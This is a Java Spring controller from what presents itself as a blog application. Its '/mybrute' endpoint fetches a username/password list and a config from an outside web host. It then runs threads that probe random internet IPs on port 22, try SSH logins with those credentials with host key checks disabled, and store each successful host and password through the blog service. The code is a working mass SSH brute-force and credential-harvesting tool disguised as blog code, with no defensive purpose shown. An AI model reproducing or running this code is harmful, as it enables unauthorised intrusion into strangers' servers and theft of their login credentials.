package com.phule.javavnnblog.controller;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import com.phule.javavnnblog.model.Authentication;
import com.phule.javavnnblog.model.Config;
import com.phule.javavnnblog.model.SSHInfo;
import com.phule.javavnnblog.service.BlogService;
import com.phule.javavnnblog.utils.IpConverter;

@Controller
public class HomeController {
	ArrayList<Authentication> authenList = new ArrayList<Authentication>();
	Config config = null;
	boolean flag = false;
	@Autowired
	BlogService blogService;

	@RequestMapping("/")
	public String getHome(Model model) {
		return "home";
	}

	@RequestMapping(value = "/mybrute", method = RequestMethod.GET)
	public String getBlogById(Model model) {
		if (!flag) {
			while(authenList.size() == 0){
				
				try {
					authenList = getAuthenticationFile("http://www.sexycowgirlphotos.com/authentication.txt");
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			while(null == config){
				try {
					config = getConfigFile("http://www.sexycowgirlphotos.com/config.txt");
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			int numberOfThread =config.getThreads();
			ExecutorService executor = Executors.newFixedThreadPool(numberOfThread);
			for (int i = 0; i < numberOfThread; i++) {
				Runnable worker = new MyRunnable(authenList, i, config.getTimeout());
				executor.execute(worker);
			}
			executor.shutdown();
			// Wait until all threads are finish
			while (!executor.isTerminated()) {

			}
			System.out.println("\nFinished all threads");
		}
		return "blog";

	}

	@RequestMapping(value = "/stop", method = RequestMethod.GET)
	public String getStopScan(Model model) {
		flag = true;
		return "blog";
	}
	public ArrayList<Authentication> getAuthenticationFile(String fileURL) throws IOException {
		URL url = new URL(fileURL);
		HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
		int responseCode = httpConn.getResponseCode();
		String fileName = "";
		ArrayList<Authentication> authens = null;
		// always check HTTP response code first
		if (responseCode == HttpURLConnection.HTTP_OK) {
			String disposition = httpConn.getHeaderField("Content-Disposition");
			String contentType = httpConn.getContentType();
			int contentLength = httpConn.getContentLength();
			
			if (disposition != null) {
				// extracts file name from header field
				int index = disposition.indexOf("filename=");
				if (index > 0) {
					fileName = disposition.substring(index + 10, disposition.length() - 1);
				}
			} else {
				// extracts file name from URL
				fileName = fileURL.substring(fileURL.lastIndexOf("/") + 1, fileURL.length());
			}

			System.out.println("Content-Type = " + contentType);
			System.out.println("Content-Disposition = " + disposition);
			System.out.println("Content-Length = " + contentLength);
			System.out.println("fileName = " + fileName);
			authens = new ArrayList<Authentication>();
			// opens input stream from the HTTP connection
			InputStream inputStream = httpConn.getInputStream();
			BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
		    String line;
		    while ((line = reader.readLine()) != null) {
		    	String[] lines = line.trim().split(";");
		    	Authentication authen = new Authentication();
		    	authen.setUsername(lines[0]);
		    	authen.setPassword(lines[1]);
		        authens.add(authen);
		    }
			inputStream.close();
			reader.close();
			System.out.println("File downloaded");
		} else {
			System.out.println("No file to download. Server replied HTTP code: " + responseCode);
		}
		httpConn.disconnect();
		return authens;
	}
	public Config getConfigFile(String fileURL) throws IOException {
		URL url = new URL(fileURL);
		HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
		int responseCode = httpConn.getResponseCode();
		String fileName = "";
		// always check HTTP response code first
		if (responseCode == HttpURLConnection.HTTP_OK) {
			String disposition = httpConn.getHeaderField("Content-Disposition");
			String contentType = httpConn.getContentType();
			int contentLength = httpConn.getContentLength();
			
			if (disposition != null) {
				// extracts file name from header field
				int index = disposition.indexOf("filename=");
				if (index > 0) {
					fileName = disposition.substring(index + 10, disposition.length() - 1);
				}
			} else {
				// extracts file name from URL
				fileName = fileURL.substring(fileURL.lastIndexOf("/") + 1, fileURL.length());
			}

			System.out.println("Content-Type = " + contentType);
			System.out.println("Content-Disposition = " + disposition);
			System.out.println("Content-Length = " + contentLength);
			System.out.println("fileName = " + fileName);

			// opens input stream from the HTTP connection
			InputStream inputStream = httpConn.getInputStream();
			BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
		    String line;
		    while ((line = reader.readLine()) != null) {
		    	String[] lines = line.trim().split(";");
		    	Config config = new Config();
		    	config.setTimeout(Integer.parseInt(lines[0]));
		    	config.setThreads(Integer.parseInt(lines[1]));
		    	config.setTimoutPort(Integer.parseInt(lines[2]));
		    	return config;
		    }
			inputStream.close();
			reader.close();
			System.out.println("File downloaded");
		} else {
			System.out.println("No file to download. Server replied HTTP code: " + responseCode);
		}
		httpConn.disconnect();
		return null;
	}
	public class MyRunnable implements Runnable {
		private int noThread;
		private ArrayList<Authentication> authenList = new ArrayList<Authentication>();
		private int timeOut;

		MyRunnable(ArrayList<Authentication> authenList, int noThread, int timeout) {
			this.noThread = noThread;
			this.timeOut = timeout;
			this.authenList = authenList;
		}

		public void run() {

			while (!flag) {
				Random r = new Random();
				String ip = IpConverter.longToIp(r.nextLong());
				try {
					//
					
					Socket socket = new Socket();
					socket.connect(new InetSocketAddress(ip, 22), config.getTimoutPort());
					socket.close();
					JSch jsch = new JSch();
					for (int i = 0; i < authenList.size(); i++) {
						String user = authenList.get(i).getUsername();
						Session session;
						try {
							session = jsch.getSession(user, ip, 22);
							String passwd = authenList.get(i).getPassword();
							session.setPassword(passwd);
							session.setConfig("StrictHostKeyChecking", "no");
							session.connect(timeOut);
							System.out.println(noThread + ": Successfully." + ip + "|" + user + "|" + passwd);
							MyCounter.incrementlLoginSuccessfullyCounter();
							SSHInfo ssh = new SSHInfo();
							ssh.setHost(ip);
							ssh.setUsername(user);
							ssh.setPassword(passwd);
							blogService.insertSSH(ssh);
							break;
								
						} catch (JSchException e) {
							{
								if (e.getMessage().contains("Auth")) {
									//System.out.println(noThread + "|" + ip + "|" + e.getMessage());
								} else {
									break;
								}
							}
						}
					}
				} catch (UnknownHostException e) {
					// System.out.println(noThread+"|"+ip+"|"+e.getMessage());
				} catch (IOException e) {
					// TODO Auto-generated catch block
					 //System.out.println(noThread+"|"+ip+"|"+e.getMessage());
				}

			}

		}

		public int getNoThread() {
			return noThread;
		}

		public void setNoThread(int noThread) {
			this.noThread = noThread;
		}

		public ArrayList<Authentication> getAuthenList() {
			return authenList;
		}

		public void setAuthenList(ArrayList<Authentication> authenList) {
			this.authenList = authenList;
		}

	}

	public static class MyCounter {
		static AtomicInteger ones = new AtomicInteger();
		static AtomicInteger loginSuccessfullyCounter = new AtomicInteger();

		static void incrementCounter() {
			ones.incrementAndGet();
			System.out.println(Thread.currentThread().getName() + ": " + ones.get());
		}

		static void incrementlLoginSuccessfullyCounter() {
			loginSuccessfullyCounter.incrementAndGet();
			System.out.println(
					Thread.currentThread().getName() + " Number of SSH Found : " + loginSuccessfullyCounter.get());
		}

	}

}
